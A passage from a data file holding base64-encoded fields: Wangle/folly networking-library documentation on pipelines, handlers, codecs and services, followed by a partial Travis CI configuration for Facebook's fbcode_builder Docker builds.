biBjbGFzcz0ibyI+Jmx0Ozwvc3Bhbj48c3BhbiBjbGFzcz0ibm8iPklPQnVm
PC9zcGFuPjxzcGFuIGNsYXNzPSJvIj4mZ3Q7Jmd0Ozwvc3Bhbj4gPHNwYW4g
Y2xhc3M9Im5vIj5waXBlbGluZTwvc3Bhbj48c3BhbiBjbGFzcz0ibyI+Ozwv
c3Bhbj4KPHNwYW4gY2xhc3M9Im5vIj5waXBlbGluZTwvc3Bhbj48c3BhbiBj
bGFzcz0ibyI+Ljwvc3Bhbj48c3BhbiBjbGFzcz0ibmYiIGRhdGEtc3ltYm9s
LW5hbWU9ImFkZEJhY2siPmFkZEJhY2s8L3NwYW4+PHNwYW4gY2xhc3M9Im8i
Pig8L3NwYW4+PHNwYW4gY2xhc3M9Im5mIiBkYXRhLXN5bWJvbC1uYW1lPSJB
c3luY1NvY2tldEhhbmRsZXIiPkFzeW5jU29ja2V0SGFuZGxlcjwvc3Bhbj48
c3BhbiBjbGFzcz0ibyI+KDwvc3Bhbj48c3BhbiBjbGFzcz0ibmMiIGRhdGEt
c3ltYm9sLW5hbWU9IkFzeW5jU29ja2V0Ij5Bc3luY1NvY2tldDwvc3Bhbj48
c3BhbiBjbGFzcz0ibyI+Ojo8L3NwYW4+PHNwYW4gY2xhc3M9Im5mIiBkYXRh
LXN5bWJvbC1jb250ZXh0PSJBc3luY1NvY2tldCIgZGF0YS1zeW1ib2wtbmFt
ZT0ibmV3U29ja2V0Ij5uZXdTb2NrZXQ8L3NwYW4+PHNwYW4gY2xhc3M9Im8i
Pig8L3NwYW4+PHNwYW4gY2xhc3M9Im5vIj5ldmVudEJhc2U8L3NwYW4+PHNw
YW4gY2xhc3M9Im8iPikpKTs8L3NwYW4+PC9wcmU+PC9kaXY+Cgo8cD5UaGUg
YWJvdmUgY3JlYXRlcyBhIHBpcGVsaW5lIGFuZCBhZGRzIGEgc2luZ2xlIEFz
eW5jU29ja2V0IGhhbmRsZXIsIHRoYXQgd2lsbCBwdXNoIHJlYWQgZXZlbnRz
IHRocm91Z2ggdGhlIHBpcGVsaW5lIHdoZW4gdGhlIHNvY2tldCBnZXRzIGJ5
dGVzLiAgTGV0JiMwMzk7cyB0cnkgaGFuZGxpbmcgc29tZSBzb2NrZXQgZXZl
bnRzOjwvcD4KCjxkaXYgY2xhc3M9InJlbWFya3VwLWNvZGUtYmxvY2siIGRh
dGEtY29kZS1sYW5nPSJwaHAiPjxwcmUgY2xhc3M9InJlbWFya3VwLWNvZGUi
PjxzcGFuIGNsYXNzPSJrIj5jbGFzczwvc3Bhbj4gPHNwYW4gY2xhc3M9Im5v
Ij5NeUhhbmRsZXI8L3NwYW4+IDxzcGFuIGNsYXNzPSJvIj46PC9zcGFuPiA8
c3BhbiBjbGFzcz0iayI+cHVibGljPC9zcGFuPiA8c3BhbiBjbGFzcz0ibm8i
PkluYm91bmRIYW5kbGVyPC9zcGFuPjxzcGFuIGNsYXNzPSJvIj4mbHQ7PC9z
cGFuPjxzcGFuIGNsYXNzPSJuYyIgZGF0YS1zeW1ib2wtbmFtZT0iZm9sbHki
PmZvbGx5PC9zcGFuPjxzcGFuIGNsYXNzPSJvIj46Ojwvc3Bhbj48c3BhbiBj
bGFzcz0ibmEiIGRhdGEtc3ltYm9sLWNvbnRleHQ9ImZvbGx5IiBkYXRhLXN5
bWJvbC1uYW1lPSJJT0J1ZlF1ZXVlIj5JT0J1ZlF1ZXVlPC9zcGFuPjxzcGFu
IGNsYXNzPSJvIj4mYW1wOyZndDs8L3NwYW4+IDxzcGFuIGNsYXNzPSJvIj4m
IzEyMzs8L3NwYW4+CiA8c3BhbiBjbGFzcz0iayI+cHVibGljPC9zcGFuPjxz
cGFuIGNsYXNzPSJvIj46PC9zcGFuPgoKICA8c3BhbiBjbGFzcz0ibm8iPnZv
aWQ8L3NwYW4+IDxzcGFuIGNsYXNzPSJuZiIgZGF0YS1zeW1ib2wtbmFtZT0i
cmVhZCI+cmVhZDwvc3Bhbj48c3BhbiBjbGFzcz0ibyI+KDwvc3Bhbj48c3Bh
biBjbGFzcz0ibm8iPkNvbnRleHQ8L3NwYW4+PHNwYW4gY2xhc3M9Im8iPio8
L3NwYW4+IDxzcGFuIGNsYXNzPSJubyI+Y3R4PC9zcGFuPjxzcGFuIGNsYXNz
PSJvIj4sPC9zcGFuPiA8c3BhbiBjbGFzcz0ibmMiIGRhdGEtc3ltYm9sLW5h
bWU9ImZvbGx5Ij5mb2xseTwvc3Bhbj48c3BhbiBjbGFzcz0ibyI+Ojo8L3Nw
YW4+PHNwYW4gY2xhc3M9Im5hIiBkYXRhLXN5bWJvbC1jb250ZXh0PSJmb2xs
eSIgZGF0YS1zeW1ib2wtbmFtZT0iSU9CdWZRdWV1ZSI+SU9CdWZRdWV1ZTwv
c3Bhbj48c3BhbiBjbGFzcz0ibyI+JmFtcDs8L3NwYW4+IDxzcGFuIGNsYXNz
PSJubyI+cTwvc3Bhbj48c3BhbiBjbGFzcz0ibyI+KTwvc3Bhbj4gPHNwYW4g
Y2xhc3M9Im5vIj5vdmVycmlkZTwvc3Bhbj4gPHNwYW4gY2xhc3M9Im8iPiYj
MTIzOzwvc3Bhbj4KICAgIDxzcGFuIGNsYXNzPSJubyI+SU9CdWZRdWV1ZTwv
c3Bhbj4gPHNwYW4gY2xhc3M9Im5vIj5kYXRhPC9zcGFuPjxzcGFuIGNsYXNz
PSJvIj47PC9zcGFuPiAgIAogICAgPHNwYW4gY2xhc3M9ImsiPmlmPC9zcGFu
PiA8c3BhbiBjbGFzcz0ibyI+KDwvc3Bhbj48c3BhbiBjbGFzcz0ibm8iPnE8
L3NwYW4+PHNwYW4gY2xhc3M9Im8iPi48L3NwYW4+PHNwYW4gY2xhc3M9Im5m
IiBkYXRhLXN5bWJvbC1uYW1lPSJjaGFpbkxlbmd0aCI+Y2hhaW5MZW5ndGg8
L3NwYW4+PHNwYW4gY2xhc3M9Im8iPigpPC9zcGFuPiA8c3BhbiBjbGFzcz0i
byI+Jmd0Oz08L3NwYW4+IDxzcGFuIGNsYXNzPSJtaSI+NDwvc3Bhbj48c3Bh
biBjbGFzcz0ibyI+KTwvc3Bhbj4gPHNwYW4gY2xhc3M9Im8iPiYjMTIzOzwv
c3Bhbj4KICAgICAgIDxzcGFuIGNsYXNzPSJubyI+ZGF0YTwvc3Bhbj48c3Bh
biBjbGFzcz0ibyI+Ljwvc3Bhbj48c3BhbiBjbGFzcz0ibmYiIGRhdGEtc3lt
Ym9sLW5hbWU9ImFwcGVuZCI+YXBwZW5kPC9zcGFuPjxzcGFuIGNsYXNzPSJv
Ij4oPC9zcGFuPjxzcGFuIGNsYXNzPSJubyI+cTwvc3Bhbj48c3BhbiBjbGFz
cz0ibyI+Ljwvc3Bhbj48c3BhbiBjbGFzcz0ibmYiIGRhdGEtc3ltYm9sLW5h
bWU9InNwbGl0Ij5zcGxpdDwvc3Bhbj48c3BhbiBjbGFzcz0ibyI+KDwvc3Bh
bj48c3BhbiBjbGFzcz0ibWkiPjQ8L3NwYW4+PHNwYW4gY2xhc3M9Im8iPikp
Ozwvc3Bhbj4KICAgICAgIDxzcGFuIGNsYXNzPSJubyI+Y3R4PC9zcGFuPjxz
cGFuIGNsYXNzPSJvIj4tJmd0Ozwvc3Bhbj48c3BhbiBjbGFzcz0ibmEiIGRh
dGEtc3ltYm9sLW5hbWU9ImZpcmVSZWFkIj5maXJlUmVhZDwvc3Bhbj48c3Bh
biBjbGFzcz0ibyI+KDwvc3Bhbj48c3BhbiBjbGFzcz0ibm8iPmRhdGE8L3Nw
YW4+PHNwYW4gY2xhc3M9Im8iPik7PC9zcGFuPgogICAgPHNwYW4gY2xhc3M9
Im8iPiYjMTI1Ozwvc3Bhbj4gCiAgPHNwYW4gY2xhc3M9Im8iPiYjMTI1Ozwv
c3Bhbj4KPHNwYW4gY2xhc3M9Im8iPiYjMTI1Ozs8L3NwYW4+PC9wcmU+PC9k
aXY+Cgo8cD5UaGlzIGhhbmRsZXIgb25seSBoYW5kbGVzIHJlYWQgKGluYm91
bmQpIGRhdGEsIHNvIHdlIGNhbiBpbmhlcml0IGZyb20gSW5ib3VuZEhhbmRs
ZXIsIGFuZCBpZ25vcmUgdGhlIG91dGJvdW5kIHR5cGUgKHNvIHRoZSBvcmRl
cmluZyBvZiBpbmJvdW5kL291dGJvdW5kIGhhbmRsZXJzIGluIHlvdXIgcGlw
ZWxpbmUgZG9lc24mIzAzOTt0IG1hdHRlcikuICAgSXQgY2hlY2tzIGlmIHRo
ZXJlIGFyZSBhdCBsZWFzdCA0IGJ5dGVzIG9mIGRhdGEgYXZhaWxhYmxlLCBh
bmQgaWYgc28sIHBhc3NlcyB0aGVtIG9uIHRvIHRoZSBuZXh0IGhhbmRsZXIu
ICBJZiB0aGVyZSBhcmVuJiMwMzk7dCB5ZXQgZm91ciBieXRlcyBvZiBkYXRh
IGF2YWlsYWJsZSwgaXQgZG9lcyBub3RoaW5nLCBhbmQgd2FpdHMgZm9yIG1v
cmUgZGF0YS48L3A+Cgo8cD5XZSBjYW4gYWRkIHRoaXMgaGFuZGxlciB0byBv
dXIgcGlwZWxpbmUgbGlrZSBzbzo8L3A+Cgo8ZGl2IGNsYXNzPSJyZW1hcmt1
cC1jb2RlLWJsb2NrIiBkYXRhLWNvZGUtbGFuZz0icGhwIj48cHJlIGNsYXNz
PSJyZW1hcmt1cC1jb2RlIj48c3BhbiBjbGFzcz0ibngiPnBpcGVsaW5lPC9z
cGFuPjxzcGFuIGNsYXNzPSJrIj4uPC9zcGFuPjxzcGFuIGRhdGEtc3ltYm9s
LW5hbWU9ImFkZEJhY2siIGNsYXNzPSJuZiI+YWRkQmFjazwvc3Bhbj48c3Bh
biBjbGFzcz0iayI+KDwvc3Bhbj48c3BhbiBkYXRhLXN5bWJvbC1uYW1lPSJN
eUhhbmRsZXIiIGNsYXNzPSJuZiI+TXlIYW5kbGVyPC9zcGFuPjxzcGFuIGNs
YXNzPSJrIj4oPC9zcGFuPjxzcGFuIGNsYXNzPSJrIj4pPC9zcGFuPjxzcGFu
IGNsYXNzPSJrIj4pPC9zcGFuPjxzcGFuIGNsYXNzPSJrIj47PC9zcGFuPjwv
cHJlPjwvZGl2PgoKPHA+YW5kIHJlbW92ZSBpdCBqdXN0IGFzIGVhc2lseTo8
L3A+Cgo8ZGl2IGNsYXNzPSJyZW1hcmt1cC1jb2RlLWJsb2NrIiBkYXRhLWNv
ZGUtbGFuZz0icGhwIj48cHJlIGNsYXNzPSJyZW1hcmt1cC1jb2RlIj48c3Bh
biBjbGFzcz0ibm8iPnBpcGVsaW5lPC9zcGFuPjxzcGFuIGNsYXNzPSJvIj4u
PC9zcGFuPjxzcGFuIGNsYXNzPSJubyI+cmVtb3ZlPC9zcGFuPjxzcGFuIGNs
YXNzPSJvIj4mbHQ7PC9zcGFuPjxzcGFuIGNsYXNzPSJubyI+TXlIYW5kbGVy
PC9zcGFuPjxzcGFuIGNsYXNzPSJvIj4mZ3Q7KCk7PC9zcGFuPjwvcHJlPjwv
ZGl2PgoKPGgzIGlkPSJzdGF0aWNwaXBlbGluZSI+U3RhdGljUGlwZWxpbmUg
PGEgaHJlZj0iI3N0YXRpY3BpcGVsaW5lIiBjbGFzcz0iaGVhZGVyTGluayI+
IzwvYT48L2gzPgoKPHA+SW5zdGFudGlhdGluZyBhbGwgdGhlc2UgaGFuZGxl
cnMgYW5kIHBpcGVsaW5lcyBjYW4gaGl0IHRoZSBhbGxvY2F0b3IgcHJldHR5
IGhhcmQuICBUaGVyZSBhcmUgdHdvIHdheXMgdG8gdHJ5IHRvIGRvIGZld2Vy
IGFsbG9jYXRpb25zLiAgU3RhdGljUGlwZWxpbmUgYWxsb3dzICphbGwqIHRo
ZSBoYW5kbGVycywgYW5kIHRoZSBwaXBlbGluZSwgdG8gYmUgaW5zdGFudGlh
dGVkIGFsbCBpbiB0aGUgc2FtZSBtZW1vcnkgYmxvY2ssIHNvIHdlIG9ubHkg
aGl0IHRoZSBhbGxvY2F0b3Igb25jZS48L3A+Cgo8cD5UaGUgb3RoZXIgb3B0
aW9uIGlzIHRvIGFsbG9jYXRlIHRoZSBoYW5kbGVycyBvbmNlIGF0IHN0YXJ0
dXAsIGFuZCByZXVzZSB0aGVtIGluIG1hbnkgcGlwZWxpbmVzLiAgVGhpcyBt
ZWFucyBhbGwgc3RhdGUgaGFzIHRvIGJlIHNhdmVkIGluIHRoZSBIYW5kbGVy
Q29udGV4dCBvYmplY3QgaW5zdGVhZCBvZiB0aGUgSGFuZGxlciBpdHNlbGYs
IHNpbmNlIGVhY2ggaGFuZGxlciBjYW4gYmUgaW4gbXVsdGlwbGUgcGlwZWxp
bmVzLiAgVGhlcmUgaXMgb25lIGNvbnRleHQgcGVyIHBpcGVsaW5lIHRvIGdl
dCBhcm91bmQgdGhpcyBsaW1pdGF0aW9uLjwvcD48L3NlY3Rpb24+PHNlY3Rp
b24gY2xhc3M9ImRleF9kb2N1bWVudCI+PGgxPkJ1aWx0LWluIGhhbmRsZXJz
PC9oMT48cCBjbGFzcz0iZGV4X2ludHJvZHVjdGlvbiI+VGhlIHN0dWZmIHRo
YXQgY29tZXMgd2l0aCB0aGUgYm94PC9wPjxoMiBpZD0iYnl0ZS10by1ieXRl
LWhhbmRsZXJzIj5CeXRlIHRvIGJ5dGUgaGFuZGxlcnMgPGEgaHJlZj0iI2J5
dGUtdG8tYnl0ZS1oYW5kbGVycyIgY2xhc3M9ImhlYWRlckxpbmsiPiM8L2E+
PC9oMj4KCjxoMyBpZD0iYXN5bmNzb2NrZXRoYW5kbGVyIj5Bc3luY1NvY2tl
dEhhbmRsZXIgPGEgaHJlZj0iI2FzeW5jc29ja2V0aGFuZGxlciIgY2xhc3M9
ImhlYWRlckxpbmsiPiM8L2E+PC9oMz4KCjxwPlRoaXMgaXMgYWxtb3N0IGFs
d2F5cyB0aGUgZmlyc3QgaGFuZGxlciBpbiB0aGUgcGlwZWxpbmUgZm9yIGNs
aWVudHMgYW5kIHNlcnZlcnMgLSBpdCBjb25uZWN0cyBhbiBBc3luY1NvY2tl
dCB0byB0aGUgcGlwZWxpbmUuICBIYXZpbmcgaXQgYXMgYSBoYW5kbGVyIGlz
IG5pY2UsIGJlY2F1c2UgbW9ja2luZyBpdCBvdXQgZm9yIHRlc3RzIGJlY29t
ZXMgdHJpdmlhbC48L3A+Cgo8aDMgaWQ9Im91dHB1dGJ1ZmZlcmluZ2hhbmRs
ZXIiPk91dHB1dEJ1ZmZlcmluZ0hhbmRsZXIgPGEgaHJlZj0iI291dHB1dGJ1
ZmZlcmluZ2hhbmRsZXIiIGNsYXNzPSJoZWFkZXJMaW5rIj4jPC9hPjwvaDM+
Cgo8cD5PdXRwdXQgaXMgYnVmZmVyZWQgYW5kIG9ubHkgc2VudCBvbmNlIHBl
ciBldmVudCBsb29wLiAgVGhpcyBsb2dpYyBpcyBleGFjdGx5IHdoYXQgaXMg
aW4gVGhyaWZ0U2VydmVyLCBhbmQgdmVyeSBzaW1pbGFyIHRvIHdoYXQgZXhp
c3RzIGluIHByb3h5Z2VuIC0gaXQgY2FuIGltcHJvdmUgdGhyb3VnaHB1dCBm
b3Igc21hbGwgd3JpdGVzIGJ5IHVwIHRvIDMwMCUuPC9wPgoKPGgzIGlkPSJl
dmVudGJhc2VoYW5kbGVyIj5FdmVudEJhc2VIYW5kbGVyIDxhIGhyZWY9IiNl
dmVudGJhc2VoYW5kbGVyIiBjbGFzcz0iaGVhZGVyTGluayI+IzwvYT48L2gz
PgoKPHA+UHV0dGluZyB0aGlzIHJpZ2h0IGFmdGVyIGFuIEFzeW5jU29ja2V0
SGFuZGxlciBtZWFucyB0aGF0IHdyaXRlcyBjYW4gaGFwcGVuIGZyb20gYW55
IHRocmVhZCwgYW5kIGV2ZW50QmFzZS0mZ3Q7cnVuSW5FdmVudEJhc2VUaHJl
YWQoKSB3aWxsIGF1dG9tYXRpY2FsbHkgYmUgY2FsbGVkIHRvIHB1dCB0aGVt
IGluIHRoZSBjb3JyZWN0IHRocmVhZC4gIEl0IGRvZXNuJiMwMzk7dCBpbnRy
aW5zaWNhbGx5IG1ha2UgdGhlIHBpcGVsaW5lIHRocmVhZC1zYWZlIHRob3Vn
aCwgd3JpdGVzIGZyb20gZGlmZmVyZW50IHRocmVhZHMgbWF5IGJlIGludGVy
bGVhdmVkLCBvdGhlciBoYW5kbGVyIHN0YWdlcyBtdXN0IGJlIG9ubHkgdXNl
ZCBmcm9tIG9uZSB0aHJlYWQgb3IgYmUgdGhyZWFkIHNhZmUsIGV0Yy48L3A+
Cgo8cD5JbiBhZGRpdGlvbiwgcmVhZHMgYXJlIHN0aWxsIGFsd2F5cyBjYWxs
ZWQgb24gdGhlIGV2ZW50QmFzZSB0aHJlYWQuPC9wPgoKPGgyIGlkPSJjb2Rl
Y3MiPkNvZGVjcyA8YSBocmVmPSIjY29kZWNzIiBjbGFzcz0iaGVhZGVyTGlu
ayI+IzwvYT48L2gyPgoKPGgzIGlkPSJmaXhlZGxlbmd0aGZyYW1lZGVjb2Rl
ciI+Rml4ZWRMZW5ndGhGcmFtZURlY29kZXIgPGEgaHJlZj0iI2ZpeGVkbGVu
Z3RoZnJhbWVkZWNvZGVyIiBjbGFzcz0iaGVhZGVyTGluayI+IzwvYT48L2gz
PgoKPHA+QSBkZWNvZGVyIHRoYXQgc3BsaXRzIHJlY2VpdmVkIElPQnVmcyBi
eSBhIGZpeGVkIG51bWJlciBvZiBieXRlcy4gIFVzZWQgZm9yIGZpeGVkLWxl
bmd0aCBwcm90b2NvbHM8L3A+Cgo8aDMgaWQ9Imxlbmd0aGZpZWxkcHJlcGVu
ZGVyIj5MZW5ndGhGaWVsZFByZXBlbmRlciA8YSBocmVmPSIjbGVuZ3RoZmll
bGRwcmVwZW5kZXIiIGNsYXNzPSJoZWFkZXJMaW5rIj4jPC9hPjwvaDM+Cgo8
cD5QcmVwZW5kcyBhIGZpeGVkLWxlbmd0aCBmaWVsZCBsZW5ndGguICBGaWVs
ZCBsZW5ndGggaXMgY29uZmlndXJhYmxlLjwvcD4KCjxoMyBpZD0ibGVuZ3Ro
ZmllbGRiYXNlZGZyYW1lZGVjIj5MZW5ndGhGaWVsZEJhc2VkRnJhbWVEZWNv
ZGVyIDxhIGhyZWY9IiNsZW5ndGhmaWVsZGJhc2VkZnJhbWVkZWMiIGNsYXNz
PSJoZWFkZXJMaW5rIj4jPC9hPjwvaDM+Cgo8cD5UaGUgcmVjZWl2aW5nIHBv
cnRpb24gb2YgTGVuZ3RoRmllbGRQcmVwZW5kZXIgLSBkZWNvZGVzIGJhc2Vk
IG9uIGEgZml4ZWQgZnJhbWUgbGVuZ3RoLCB3aXRoIG9wdGlvbmFsIGhlYWRl
ci90YWlsZXIgZGF0YSBzZWN0aW9ucy48L3A+Cgo8aDMgaWQ9ImxpbmViYXNl
ZGZyYW1lZGVjb2RlciI+TGluZUJhc2VkRnJhbWVEZWNvZGVyIDxhIGhyZWY9
IiNsaW5lYmFzZWRmcmFtZWRlY29kZXIiIGNsYXNzPSJoZWFkZXJMaW5rIj4j
PC9hPjwvaDM+Cgo8cD5EZWNvZGVzIGJ5IGxpbmUgKHdpdGggb3B0aW9uYWwg
ZW5kaW5nIGRldGVjdGlvbiB0eXBlcyksIHRvIGJlIHVzZWQgZm9yIHRleHQt
YmFzZWQgcHJvdG9jb2xzPC9wPgoKPGgzIGlkPSJzdHJpbmdjb2RlYyI+U3Ry
aW5nQ29kZWMgPGEgaHJlZj0iI3N0cmluZ2NvZGVjIiBjbGFzcz0iaGVhZGVy
TGluayI+IzwvYT48L2gzPgoKPHA+Q29udmVydHMgZnJvbSBJT0J1ZnMgdG8g
c3RkOjpzdHJpbmdzIGFuZCBiYWNrIGZvciB0ZXh0LWJhc2VkIHByb3RvY29s
cy4gIE11c3QgYmUgdXNlZCBhZnRlciBvbmUgb2YgdGhlIGFib3ZlIGZyYW1l
IGRlY29kZXJzPC9wPjwvc2VjdGlvbj48c2VjdGlvbiBjbGFzcz0iZGV4X2Rv
Y3VtZW50Ij48aDE+U2VydmljZXM8L2gxPjxwIGNsYXNzPSJkZXhfaW50cm9k
dWN0aW9uIj5Ib3cgdG8gYWRkIGEgbmV3IHByb3RvY29sPC9wPjxwPjxhIGhy
ZWY9Imh0dHBzOi8vdHdpdHRlci5naXRodWIuaW8vZmluYWdsZS9ndWlkZS9T
ZXJ2aWNlc0FuZEZpbHRlcnMuaHRtbCIgdGFyZ2V0PSJfYmxhbmsiPkZpbmFn
bGUmIzAzOTtzIGRvY3VtZW50YXRpb248L2E+IG9uIFNlcnZpY2VzIGlzIGhp
Z2hseSByZWNvbW1lbmRlZDwvcD4KCjxoMiBpZD0ic2VydmljZXMiPlNlcnZp
Y2VzIDxhIGhyZWY9IiNzZXJ2aWNlcyIgY2xhc3M9ImhlYWRlckxpbmsiPiM8
L2E+PC9oMj4KCjxwPkEgUGlwZWxpbmUgd2FzIHJlYWQoKSBhbmQgd3JpdGUo
KSBtZXRob2RzIC0gaXQgc3RyZWFtcyBieXRlcyBpbiBvbmUgb3IgYm90aCBk
aXJlY3Rpb25zLiAgd3JpdGUoKSByZXR1cm5zIGEgZnV0dXJlLCBidXQgdGhl
IGZ1dHVyZSBpcyBzZXQgd2hlbiB0aGUgYnl0ZXMgYXJlIHN1Y2Nlc3NmdWxs
eSB3cml0dGVuLiAgIFVzaW5nIHBpcGVsaW5lIHRoZXJlIGlzIG5vIGVhc3kg
d2F5IHRvIG1hdGNoIHVwIHJlcXVlc3RzIGFuZCByZXNwb25zZXMgZm9yIFJQ
Qy48L3A+Cgo8cD5BIFNlcnZpY2UgaXMgYW4gUlBDIGFic3RyYWN0aW9uIC0g
Qm90aCBjbGllbnRzIGFuZCBzZXJ2ZXJzIGltcGxlbWVudCB0aGUgaW50ZXJm
YWNlLiAgIFNlcnZlcnMgaW1wbGVtZW50IGl0IGJ5IGhhbmRsaW5nIHRoZSBy
ZXF1ZXN0LiAgQ2xpZW50cyBpbXBsZW1lbnQgaXQgYnkgc2VuZGluZyB0aGUg
cmVxdWVzdCB0byB0aGUgc2VydmVyIHRvIGNvbXBsZXRlLjwvcD4KCjxwPkEg
RGlzcGF0Y2hlciBpcyB0aGUgYWRhcHRlciBiZXR3ZWVuIHRoZSBQaXBlbGlu
ZSBhbmQgU2VydmljZSB0aGF0IG1hdGNoZXMgdXAgdGhlIHJlcXVlc3RzIGFu
ZCByZXNwb25zZXMuICBUaGVyZSBhcmUgc2V2ZXJhbCBidWlsdCBpbiBEaXNw
YXRjaGVycywgaG93ZXZlciBpZiB5b3UgYXJlIGRvaW5nIGFueXRoaW5nIGFk
dmFuY2VkLCB5b3UgbWF5IG5lZWQgdG8gd3JpdGUgeW91ciBvd24uPC9wPgoK
PHA+QmVjYXVzZSBib3RoIGNsaWVudHMgYW5kIHNlcnZlcnMgaW1wbGVtZW50
IHRoZSBzYW1lIGludGVyZmFjZSwgbW9ja2luZyBlaXRoZXIgY2xpZW50cyBv
ciBzZXJ2ZXJzIGlzIHRyaXZpYWxseSBlYXN5LjwvcD4KCjxoMiBpZD0ic2Vy
dmljZWZpbHRlcnMiPlNlcnZpY2VGaWx0ZXJzIDxhIGhyZWY9IiNzZXJ2aWNl
ZmlsdGVycyIgY2xhc3M9ImhlYWRlckxpbmsiPiM8L2E+PC9oMj4KCjxwPlNl
cnZpY2VGaWx0ZXJzIHByb3ZpZGUgYSB3YXkgdG8gd3JhcCBmaWx0ZXJzIGFy
b3VuZCBldmVyeSByZXF1ZXN0IGFuZCByZXNwb25zZS4gIFRoaW5ncyBsaWtl
IGxvZ2dpbmcsIHRpbWVvdXRzLCByZXRyeWluZyByZXF1ZXN0cywgZXRjLiBj
YW4gYmUgaW1wbGVtZW50ZWQgYXMgU2VydmljZUZpbHRlcnMuPC9wPgoKPHA+
RXhpc3RpbmcgU2VydmljZUZpbHRlcnMgaW5jbHVkZTo8L3A+Cgo8dWw+Cjxs
aT5DbG9zZU9uUmVsZWFzZUZpbHRlciAtIHJlamVjdHMgcmVxdWVzdHMgYWZ0
ZXIgY29ubmVjdGlvbiBpcyBjbG9zZWQuICBPZnRlbiB1c2VkIGluIGNvbmp1
bmN0aW9uIHdpdGg8L2xpPgo8bGk+RXhwaXJpbmdGaWx0ZXIgLSBpZGxlIHRp
bWVvdXQgYW5kIG1heCBjb25uZWN0aW9uIHRpbWUgKHVzdWFsbHkgdXNlZCBm
b3IgY2xpZW50cyk8L2xpPgo8bGk+VGltZW91dEZpbHRlciAtIHJlcXVlc3Qg
dGltZW91dCB0aW1lLiAgVXN1YWxseSB1c2VkIG9uIHNlcnZlcnMuICBDbGll
bnRzIGNhbiB1c2UgZnV0dXJlLndpdGhpbiB0byBzcGVjaWZ5IHRpbWVvdXRz
IGluZGl2aWR1YWxseS48L2xpPgo8bGk+RXhlY3V0b3JGaWx0ZXIgLSBtb3Zl
IHJlcXVlc3RzIHRvIGEgZGlmZmVyZW50IGV4ZWN1dG9yLjwvbGk+CjwvdWw+
Cgo8aDIgaWQ9InNlcnZpY2VmYWN0b3JpZXMiPlNlcnZpY2VGYWN0b3JpZXMg
PGEgaHJlZj0iI3NlcnZpY2VmYWN0b3JpZXMiIGNsYXNzPSJoZWFkZXJMaW5r
Ij4jPC9hPjwvaDI+Cgo8cD5Gb3Igc29tZSBzZXJ2aWNlcywgYSBGYWN0b3J5
IGNhbiBoZWxwIGluc3RhbnRpYXRlIGNsaWVudHMuICAgSW4gRmluYWdsZSwg
dGhlc2UgYXJlIGZyZXF1ZW50bHkgcHJvdmlkZWQgZm9yIGVhc3kgdXNlIHdp
dGggc3BlY2lmaWMgcHJvdG9jb2xzLCBpLmUuIGh0dHAsIG1lbWNhY2hlLCBl
dGMuPC9wPgoKPGgyIGlkPSJzZXJ2aWNlZmFjdG9yeWZpbHRlcnMiPlNlcnZp
Y2VGYWN0b3J5RmlsdGVycyA8YSBocmVmPSIjc2VydmljZWZhY3RvcnlmaWx0
ZXJzIiBjbGFzcz0iaGVhZGVyTGluayI+IzwvYT48L2gyPgoKPHA+U2Vydmlj
ZUZhY3RvcnlGaWx0ZXJzIHByb3ZpZGUgZmlsdGVycyBmb3IgZ2V0dGluZyBj
bGllbnRzLiAgVGhlc2UgaW5jbHVkZSBtb3N0IGNvbm5lY3Rpb24tb3JpZW50
ZWQgdGhpbmdzLCBsaWtlIGNvbm5lY3Rpb24gcG9vbGluZywgc2VsZWN0aW9u
LCBkaXNwYXRjaCwgbG9hZCBiYWxhbmNpbmcsIGV0Yy48L3A+Cgo8cD5FeGlz
dGluZyBTZXJ2aWNlRmFjdG9yeUZpbHRlcnM6PC9wPgoKPHVsPgo8bGk+PC9s
aT4KPGxpPjwvbGk+CjwvdWw+PC9zZWN0aW9uPgo=
",,"IyBGYWNlYm9vayBwcm9qZWN0cyB0aGF0IHVzZSBgZmJjb2RlX2J1aWxkZXJg
IGZvciBjb250aW51b3VzIGludGVncmF0aW9uCiMgc2hhcmUgdGhpcyBUcmF2
aXMgY29uZmlndXJhdGlvbiB0byBydW4gYnVpbGRzIHZpYSBEb2NrZXIuCgoj
IERvY2tlciBkaXNhYmxlcyBJUHY2IGluIGNvbnRhaW5lcnMgYnkgZGVmYXVs
dC4gRW5hYmxlIGl0IGZvciB1bml0IHRlc3RzIHRoYXQgbmVlZCBbOjoxXS4K
YmVmb3JlX3NjcmlwdDoKICAtIGlmIFtbICIkVFJBVklTX09TX05BTUUiICE9
ICJvc3giIF1dOwogICAgdGhlbgogICAgICBzdWRvIGJ1aWxkL2ZiY29kZV9i
dWlsZGVyL2RvY2tlcl9lbmFibGVfaXB2Ni5zaDsKICAgIGZpCgplbnY6CiAg
Z2xvYmFsOgogICAgLSB0cmF2aXNfY2FjaGVfZGlyPSRIT01FL3RyYXZpc19j
Y2FjaGUKICAgICMgVHJhdmlzIHRpbWVzIG91dCBhZnRlciA1MCBtaW51dGVz
LiBWZXJ5IGdlbmVyb3VzbHkgbGVhdmUgMTAgbWludXRlcwogICAgIyBmb3Ig
c2V0dXAgKGUuZy4gIGNhY2hlIGRvd25sb2FkLCBjb21wcmVzc2lvbiwgYW5k
IHVwbG9hZCksIHNvIHdlIG5ldmVyCiAgICAjIGZhaWwgdG8gY2FjaGUgdGhl
IHByb2dyZXNzIHdlIG1hZGUuCiAgICAtIGRvY2tlcl9idWlsZF90aW1lb3V0
PTQwbQoKY2FjaGU6CiAgIyBPdXIgYnVpbGQgY2FjaGVzIGNhbiBiZSAyMDAt
MzAwTUIsIHNvIGluY3JlYXNlIHRoZSB0aW1lb3V0IHRvIDcgbWludXRlcwog
ICMgdG8gbWFrZSBzdXJlIHdlIG5ldmVyIGZhaWwgdG8gY2FjaGUgdGhlIHBy
b2dyZXNzIHdlIG1hZGUuCiAgdGltZW91dDogNDIwCiAgZGlyZWN0b3JpZXM6
CiAgLSAkSE9NRS90cmF2aXNfY2NhY2hlICAjIHNlZSBkb2NrZXJfYnVpbGRf
d2l0aF9jY2FjaGUuc2gKCiMgVWdoLCBgc2VydmljZXM6YCBtdXN0IGJlIGlu
IHRoZSBtYXRyaXgsIG9yIHdlIGdldCBgZG9ja2VyOiBjb21tYW5kIG5vdCBm
b3VuZGAKIyAgIGh0dHBzOi8vZ2l0aHViLmNvbS90cmF2aXMtY2kvdHJhdmlz
LWNpL2lzc3Vlcy81MTQyCm1hdHJpeDoKICBpbmNsdWRlOgogICAgLSBlbnY6
IFsnb3NfaW1hZ2U9dWJ1bnR1OjE4LjA0JywgZ2NjX3ZlcnNpb249N10KICAg
ICAgc2VydmljZXM6IFtkb2NrZXJdCgphZGRvbnM6CiAgYXB0OgogICAgcGFj
